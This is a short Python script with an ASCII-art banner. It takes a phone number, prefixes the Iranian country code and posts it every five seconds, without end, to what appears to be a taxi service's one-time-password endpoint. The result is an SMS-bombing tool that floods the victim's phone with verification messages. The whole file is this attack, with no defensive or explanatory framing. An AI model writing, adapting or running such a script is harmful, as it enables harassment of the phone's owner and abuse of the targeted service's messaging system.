import os
import requests
import time
os.system("clear")
print ("            _          ")
print ("__   ____ _(_)___  ___ ")
print ("\ \ / / _` | / __|/ __|")
print (" \ V / (_| | \__ \ (__ ")
print ("  \_/ \__, |_|___/\___|")
print ("         |_|           ")
phnenum = input("Enter The Number: ")
urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
mydata = {"cellphone":"+98"+phnenum}
print(mydata) 


while True :
    requests.post(urlsend,data=mydata)
    print("sms send")
    time.sleep(5)
